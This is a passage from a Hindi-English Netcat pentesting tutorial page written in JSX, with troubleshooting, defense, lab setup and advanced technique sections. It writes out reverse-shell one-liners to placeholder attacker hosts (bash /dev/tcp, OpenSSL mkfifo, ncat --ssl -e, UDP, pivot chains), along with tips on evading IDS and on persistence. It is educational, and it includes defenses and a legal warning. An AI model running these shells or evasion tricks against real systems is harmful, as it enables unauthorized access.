            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Chat Mode</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (--chat)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Access Control</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (--allow, --deny)</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">IPv6</td><td className="py-2 px-3">हाँ (-6)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">सबसे आसान</td><td className="py-2 px-3">आसान</td><td className="py-2 px-3">Complex</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: '-e flag काम नहीं कर रहा', a: 'कुछ Netcat versions (security reasons) में -e disable है। Bash reverse shell use करो: bash -i >& /dev/tcp/attacker/4444 0>&1। Ya Ncat install करो — उसमें -e हमेशा काम करता है। mkfifo method भी try करो — -e dependency हटाता है।' },
          { q: 'Connection timeout हो रहा है', a: '-w flag से timeout बढ़ाओ: nc -w 10 target 80। Firewall block कर रहा होगा — अलग port try करो। Network connectivity check करो: ping target_ip। DNS resolution disable करो (-n flag) — faster होगा।' },
          { q: 'UDP scan reliable नहीं है', a: 'UDP connectionless protocol है — -z flag reliable नहीं। ICMP unreachable messages check करो। Nmap -sU better है UDP scanning के लिए। कुछ services UDP पर response नहीं देतीं।' },
          { q: 'File transfer बीच में रुक गया', a: 'Large files के लिए tar+nc method use करो। Network stability check करो। pv command से progress देखो: pv file | nc target 4444। -w timeout increase करो। Checksum verify करो transfer के बाद।' },
          { q: 'Reverse shell disconnect हो गया', a: 'Stable shell के लिए Python PTY upgrade करो: python3 -c "import pty;pty.spawn(/bin/bash)"। Screen/tmux use करो background में। -k flag से persistent listener बनाओ। Network stability check करो।' },
          { q: 'Port already in use error', a: 'lsof -i :PORT या ss -tlnp से check करो कौन use कर रहा है। दूसरा port choose करो। kill command से process terminate करो। SO_REUSEADDR option (Ncat) use करो।' },
          { q: 'Connection refused error', a: 'Target port पर कोई service listen नहीं कर रही। Port number verify करो। Firewall rules check करो (iptables -L)। Service start करो target पर। सही IP address use कर रहे हो verify करो।' },
          { q: 'Data loss during transfer', a: 'TCP reliable protocol है — data loss normally नहीं होना चाहिए। Network issues check करो (packet loss)। Integrity verify करो: sha256sum compare करो sender और receiver दोनों तरफ।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Net activity detect और prevent करने के लिए multiple layers of defense चाहिए। Netcat traffic pattern recognition, process monitoring, और network segmentation सब ज़रूरी हैं। Defense-in-depth approach use करो — एक ही control पर depend मत करो।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Firewall Rules:</strong> Unnecessary ports block करें — inbound और outbound दोनों। Egress filtering से reverse shells block होंगे। Default deny policy use करो।</li>
        <li><strong className="text-white">IDS/IPS:</strong> Snort/Suricata से suspicious connections detect करें। Netcat patterns के signatures available हैं। Regular rule updates करो।</li>
        <li><strong className="text-white">Netflow Monitoring:</strong> Unusual port usage और long connections flag करें। Baseline establish करो, anomalies detect करो। Real-time alerting setup करो।</li>
        <li><strong className="text-white">Process Monitoring:</strong> nc/ncat/socat processes alert करें। EDR solutions use करो जो process execution monitor करें। Command-line argument logging enable करो।</li>
        <li><strong className="text-white">Application Whitelisting:</strong> सिर्फ approved binaries run होने दें। Unknown executables block करो। Path-based restrictions लगाओ।</li>
        <li><strong className="text-white">Egress Filtering:</strong> Outbound connections restrict करें — reverse shells block होंगे। Only allowed ports/destinations। Firewall policy review करो regularly।</li>
        <li><strong className="text-white">DNS Monitoring:</strong> DNS tunneling detect करो — unusual DNS queries flag करो। DNS logging enable करो। DNS-based threat intelligence use करो।</li>
        <li><strong className="text-white">SSL Inspection:</strong> Encrypted Netcat (Ncat --ssl) detect करो — SSL decrypt proxy use करो। Certificate pinning enforce करो।</li>
        <li><strong className="text-white">Honeypots:</strong> Decoy services deploy करो — Netcat connections to honeypots trigger alerts। Tarpitting techniques use करो attacker को slow करने के लिए।</li>
        <li><strong className="text-white">Network Segmentation:</strong> Critical systems isolate करो — lateral movement मुश्किल होगी। Micro-segmentation implement करो। Zero-trust model adopt करो।</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Netcat practice के लिए safe lab बनाना ज़रूरी है। दो machines/VMs चाहिए — एक attacker, एक target। VirtualBox या VMware use करो। Network isolation ensure करो — real network पर practice मत करो।
      </p>
      <CodeBlock
        title="Practice Lab"
        code={`# दो machines/VMs चाहिए:
# Machine A (Attacker): Kali Linux
# Machine B (Target): Ubuntu/Windows VM

# Network setup:
# VirtualBox Host-Only Adapter
# दोनों VMs same subnet पर हों
# उदाहरण: 192.168.56.10 (attacker) और 192.168.56.20 (target)

# Practice exercises:
# 1. Basic connect/listen — nc target 80
# 2. Port scanning — nc -zv target 1-1000
# 3. Banner grabbing — SSH, HTTP, FTP banners
# 4. File transfer — दोनों directions
# 5. Reverse shell — Linux (all 10 methods)
# 6. Reverse shell — Windows (cmd.exe + PowerShell)
# 7. Bind shell — target पर bind, attacker connect
# 8. Chat server — दो terminals
# 9. Port forwarding — mkfifo method
# 10. Encrypted shells — OpenSSL + Ncat
# 11. UDP operations — file transfer, shell
# 12. Python PTY upgrade — stable shell बनाओ

# Verification:
# हर exercise के बाद connection properly close करो
# Firewall rules check करो (iptables -L)
# Process list check करो (ps aux | grep nc)`}
      />

      <h2>Advanced Techniques</h2>
      <p>
        Netcat के advanced techniques complex scenarios में काम आते हैं — encrypted communication, proxy chains, port knocking, और web server emulation। ये techniques real-world pentesting में बहुत useful हैं।
      </p>
      <CodeBlock
        title="Netcat as Network Diagnostics Tool"
        code={`# DNS lookup (manual):
echo -e "google.com\\r" | nc -w 3 8.8.8.8 53

# SMTP server test:
nc mail.server.com 25
EHLO test.com
MAIL FROM: test@test.com
RCPT TO: user@server.com
DATA
Subject: Test
Test message
.
QUIT

# HTTP/1.1 request with headers:
echo -e "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: */*\\r\\n\\r\\n" | nc target.com 80

# HTTPS with OpenSSL:
echo -e "GET / HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n" | openssl s_client -connect target.com:443 -quiet 2>/dev/null

# FTP server test:
nc ftp.server.com 21
USER anonymous
PASS test@test.com
LIST
QUIT

# MySQL connection test:
nc mysql.server.com 3306
# Server banner will appear if port is open

# POP3 mailbox check:
nc mail.server.com 110
USER username
PASS password
LIST
QUIT

# Port knocking sequence:
for port in 7000 8000 9000; do
    nc -zv -w 1 target $port
    sleep 0.5
done
# Hidden service should now be accessible
nc target 22`}
      />
      <CodeBlock
        title="Advanced Netcat Operations"
        code={`# Encrypted reverse shell (OpenSSL):
# Step 1: Certificate generate करो (attacker):
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Step 2: Listener start करो (attacker):
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Step 3: Connect करो (victim):
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker:4444 > /tmp/s

# Ncat encrypted shell (easier):
# Attacker:
ncat --ssl -lvnp 4444
# Victim:
ncat --ssl -e /bin/bash attacker_ip 4444

# UDP reverse shell:
# Attacker:
nc -ulvp 4444
# Victim:
bash -i >& /dev/udp/attacker_ip/4444 0>&1

# Source port specify (firewall bypass):
nc -p 12345 target 80

# Keep listening (-k) — multiple connections:
nc -lkvnp 4444

# Background listener:
nc -lkvnp 4444 &
# Process ID मिलेगा — kill PID से बंद करो

# Proxy chain (through jump host):
ssh -L 8080:internal:80 user@jumphost
# फिर: nc localhost 8080

# Execute command after connect:
echo "uname -a" | nc target_ip 4444

# Netcat as web server (temporary):
while true; do echo -e "HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Hello</h1>" | nc -lvnp 80; done

# Port knocking (sequence of ports open hidden service):
for port in 7000 8000 9000; do nc -zv target $port; done
# फिर actual port try करो: nc target 22

# Double reverse shell (through pivot):
# Pivot machine:
nc -lvnp 4444 | nc -lvnp 5555
# Victim: nc pivot_ip 4444 -e /bin/bash
# Attacker: nc pivot_ip 5555`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Netcat और Ncat में क्या फ़र्क है?', a: 'Ncat Nmap team का version है — SSL/TLS, proxy, authentication, access control support करता है। Netcat original है — simpler लेकिन कम features। Pentesting के लिए Ncat बेहतर है क्योंकि encrypted shells और access control मिलता है।' },
          { q: 'क्या Netcat detect हो सकता है?', a: 'हाँ, IDS/IPS और process monitoring से detect हो सकता है। Encrypted shells (OpenSSL/Ncat --ssl) और non-standard ports से evasion possible है। Traffic pattern analysis भी detection method है।' },
          { q: 'Reverse shell और bind shell में क्या फ़र्क है?', a: 'Reverse shell में victim attacker को connect करता है (firewall bypass — outbound usually allowed)। Bind shell में victim port open करता है, attacker connect करता है (inbound connection)। Reverse shell ज़्यादा common है।' },
          { q: 'File transfer secure है?', a: 'Plain Netcat से नहीं — data unencrypted transfer होता है (network sniffing possible)। Encrypted transfer के लिए OpenSSL pipe या Ncat --ssl use करो। Integrity verify करो: sha256sum compare करो।' },
          { q: 'Windows पर काम करता है?', a: 'हाँ, nc.exe Windows पर चलता है। PowerShell भी native TCP sockets support करता है। Ncat Windows installer available है Nmap website से। Windows 10+ में built-in OpenSSH client भी है।' },
          { q: 'Kali NetHunter में कैसे use करें?', a: 'Termux में pkg install netcat करो। फिर normally use करो — port scanning, reverse shells सब काम करेगा। Nethunter app में full Kali environment में भी available है।' },
          { q: 'क्या Netcat persistent है?', a: 'नहीं, Netcat एक interactive tool है — process exit होने पर connection बंद। Persistent access के लिए -k flag (keep listening) use करो, या cron job/systemd service बनाओ। Screen/tmux में run करो background के लिए।' },
          { q: 'Netcat vs Socat — कौन सा better है?', a: 'Simple tasks के लिए Netcat better है (easy syntax, हर जगह available)। Complex operations (SSL, pipes, TUN/TAP, bidirectional sockets) के लिए Socat better है (ज़्यादा flexible)। दोनों सीखो — complementary tools हैं।' },
          { q: 'Meterpreter vs Netcat shell — कौन better?', a: 'Meterpreter advanced है — file upload/download, screenshot, keylog, migrate। Netcat basic shell है लेकिन हर जगह available, detect नहीं होता। Meterpreter stable है, Netcat shell crash हो सकता है। Best: Netcat से initial shell, फिर Meterpreter upgrade।' },
          { q: 'Shell upgrade क्यों ज़रूरी है?', a: 'Basic nc shell में tab completion, Ctrl+C, arrow keys काम नहीं करते। Python PTY upgrade से interactive shell मिलता है। Without upgrade: commands type करना मुश्किल, background processes handle नहीं होते।' },
          { q: 'Can Netcat be used for port forwarding permanently?', a: 'Temporary solution है — process exit पर forwarding बंद। Persistent के लिए: systemd service बनाओ, ya iptables NAT rules use करो। socat या rinetd permanent forwarding के लिए better हैं।' },
          { q: 'How to detect Netcat on a system?', a: 'ps aux | grep nc, netstat -tlnp, lsof -i से detect होता है। EDR solutions process monitoring से alert करते हैं। Encrypted shells (Ncat --ssl) harder to detect हैं। Network traffic analysis से unusual connections identify होती हैं।' },
          { q: 'Netcat over Internet safe है?', a: 'Plain Netcat bilkul safe नहीं — data unencrypted, easily sniffable। Internet पर use करना है तो Ncat --ssl या OpenSSL pipe mandatory है। VPN tunnel भी option है। Public networks पर plain nc कभी मत use करो।' },
          { q: 'Multiple shells simultaneously possible?', a: 'हाँ, -k flag से persistent listener बनाओ। Multiple ports पर listeners start करो: nc -lvnp 4444, nc -lvnp 4445, nc -lvnp 4446। Background में run करने के लिए screen/tmux use करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Port Knocking</h2>
      <p>
        Port knocking एक security technique है जिसमें hidden service को access करने के लिए specific sequence में ports पर connection attempts भेजने होते हैं। Netcat से port knocking implement और test कर सकते हो। यह firewall rules के साथ combine करके extra layer of security बनाई जा सकती है।
      </p>
      <CodeBlock
        title="Port Knocking Implementation"
        code={`# Port knock sequence (attacker side):
# पहले 3 ports पर knock करो, फिर actual port try करो
for port in 7000 8000 9000; do
  nc -zv -w 1 target_ip $port
  sleep 0.5
done

# अब actual service access करो:
nc target_ip 22

# Server side (iptables + knockd):
# knockd config (/etc/knockd.conf):
# [openSSH]
#   sequence = 7000,8000,9000
#   seq_timeout = 10
#   command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
#   tcpflags = syn

# Simple port knock script:
#!/bin/bash
TARGET=$1
echo "[*] Knocking on $TARGET..."
nc -zv -w 1 $TARGET 7000 2>/dev/null
sleep 0.3
nc -zv -w 1 $TARGET 8000 2>/dev/null
sleep 0.3
nc -zv -w 1 $TARGET 9000 2>/dev/null
sleep 0.3
echo "[+] Knock sequence sent. Try connecting now:"
echo "    nc $TARGET 22"`}
      />

      <h2>Netcat as Temporary Web Server</h2>
      <p>
        Netcat से temporary web server बनाया जा सकता है। यह quick file sharing, phishing page hosting, और testing के लिए useful है। Production के लिए नहीं, लेकिन emergency में काम आता है।
      </p>
      <CodeBlock
        title="Simple Web Server"
        code={`# Basic web server (single response):
while true; do
  echo -e "HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nConnection: close\\r\\n\\r\\n<h1>Hello from Netcat!</h1><p>Current time: $(date)</p>" | nc -lvnp 8080
done

# File serving web server:
while true; do
  echo -e "HTTP/1.1 200 OK\\r\\nContent-Type: application/octet-stream\\r\\nContent-Disposition: attachment; filename=file.txt\\r\\nConnection: close\\r\\n\\r\\n$(cat file.txt)" | nc -lvnp 8080
done

# PHP-like dynamic content:
while true; do
  REQUEST=$(nc -lvnp 8080)
  echo "$REQUEST" | grep "GET" > /dev/null
  if [ $? -eq 0 ]; then
    PAGE=$(echo "$REQUEST" | awk '{print $2}' | tr -d '/')
    echo -e "HTTP/1.1 200 OK\\r\\n\\r\\n<h1>Requested: $PAGE</h1>" | nc -lvnp 8080
  fi
done

# Log all requests:
while true; do
  nc -lvnp 8080 | tee -a requests.log
done`}
      />

      <h2>Troubleshooting Shells</h2>
      <p>
        Netcat shells में कई common issues आते हैं — broken pipes, stale connections, input issues। यहाँ practical troubleshooting tips हैं जो real-world pentesting में daily काम आती हैं।
      </p>
      <CodeBlock
        title="Shell Troubleshooting"
        code={`# Problem: Shell disconnect हो गया
# Solution: Persistent listener + auto-reconnect
while true; do
  echo "[*] Waiting for connection..."
  nc -lvnp 4444
  echo "[!] Connection lost. Restarting listener..."
  sleep 2
done

# Problem: Ctrl+C shell kill कर देता है
# Solution: Python PTY upgrade करो
python3 -c "import pty;pty.spawn('/bin/bash')"
# फिर: Ctrl+Z → stty raw -echo → fg → export TERM=xterm

# Problem: Tab completion काम नहीं कर रहा
# Solution: PTY spawn करो (ऊपर वाला command)

# Problem: Arrow keys garbage characters दिखा रहे हैं
# Solution: export TERM=xterm (after PTY upgrade)

# Problem: Background processes shell से detach नहीं हो रहे
# Solution: nohup use करो: nohup command &

# Problem: File transfer stuck हो गया
# Solution: Timeout बढ़ाओ: nc -w 300 target 4444 < file
# Progress monitor: pv file | nc target 4444

# Problem: Connection refused आ रहा है
# Solution: Port verify करो: nc -zv target_ip port
# Firewall check: iptables -L -n (target पर)
# Service running है?: ss -tlnp | grep PORT`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ncat</td><td className="py-2 px-3">Advanced Netcat</td><td className="py-2 px-3">SSL/TLS, proxy, authentication, access control</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Socat</td><td className="py-2 px-3">Socket multiplexer</td><td className="py-2 px-3">Complex socket operations, SSL, TUN/TAP, pipes</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PowerShell</td><td className="py-2 px-3">Windows scripting</td><td className="py-2 px-3">Native TCP sockets, no install needed, built-in</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">curl</td><td className="py-2 px-3">HTTP client</td><td className="py-2 px-3">HTTP/HTTPS connections, file transfer, API testing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">nmap</td><td className="py-2 px-3">Port scanner</td><td className="py-2 px-3">Advanced scanning, service/OS detection, NSE scripts</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Chisel</td><td className="py-2 px-3">Tunneling</td><td className="py-2 px-3">HTTP tunnel, SOCKS5 proxy, firewall bypass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">stunnel</td><td className="py-2 px-3">SSL wrapper</td><td className="py-2 px-3">Any TCP service को SSL encrypt करे</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Cryptcat</td><td className="py-2 px-3">Encrypted Netcat</td><td className="py-2 px-3">Twofish encryption built-in, lightweight</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>mkfifo method सबसे reliable reverse shell है — -e flag dependency हटाता है, हर system पर काम करता है</li>
          <li>Encrypted shells के लिए OpenSSL pipe use करो — IDS/IPS detect नहीं कर पाएगा, traffic encrypted दिखेगा</li>
          <li>Python PTY upgrade करो immediately after getting shell: python3 -c "import pty;pty.spawn('/bin/bash')" — tab completion और Ctrl+C काम करेंगे</li>
          <li>Ncat --ssl सबसे आसान encrypted shell method है — certificate auto-generate होता है</li>
          <li>-k flag से persistent listener बनाओ — multiple connections handle होंगे, listener restart नहीं होगा</li>
          <li>Port forwarding के लिए mkfifo method reliable है, Ncat --sh-exec आसान लेकिन Ncat-specific</li>
          <li>File transfer में integrity verify करो — sha256sum compare करो sender और receiver दोनों तरफ</li>
          <li>Non-standard ports use करो shells के लिए — 4444, 1234 जैसे common ports detect होते हैं। 443, 53, 80 try करो (normal traffic जैसे दिखते हैं)</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Netcat एक शक्तिशाली नेटवर्किंग टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग, नेटवर्क ट्रबलशूटिंग, और शैक्षिक उद्देश्यों के लिए करें। बिना अनुमति के रिवर्स शेल, बाइंड शेल, या पोर्ट स्कैनिंग करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध हो सकता है — 3 साल तक की जेल और 5 लाख तक का जुर्माना। केवल अपने लैब वातावरण या लिखित प्राधिकरण के साथ ही उपयोग करें।
      </div>
    </TutorialLayout>
  )
}
